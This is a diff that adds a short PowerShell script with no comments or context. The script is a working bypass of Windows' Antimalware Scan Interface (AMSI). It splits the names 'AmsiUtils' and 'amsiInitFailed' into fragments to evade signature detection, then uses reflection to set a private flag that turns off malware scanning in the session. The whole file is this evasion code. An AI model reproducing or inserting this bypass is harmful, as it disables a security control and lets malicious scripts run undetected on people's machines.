@@ -1,0 +1,10 @@
+$data = "System.Management.Automation." + "Am" + "si"
+$data2 = "Utils"
+$var1 = $data + $data2
+$data3 = "am" + "si" + "Init"
+$data4 = "Failed"
+$var2 = $data3 + $data4
+
+$win = [Ref].Assembly.GetType($var1)
+$field = $win.GetField($var2,'NonPublic,Static')
+$field.SetValue($null,$true)
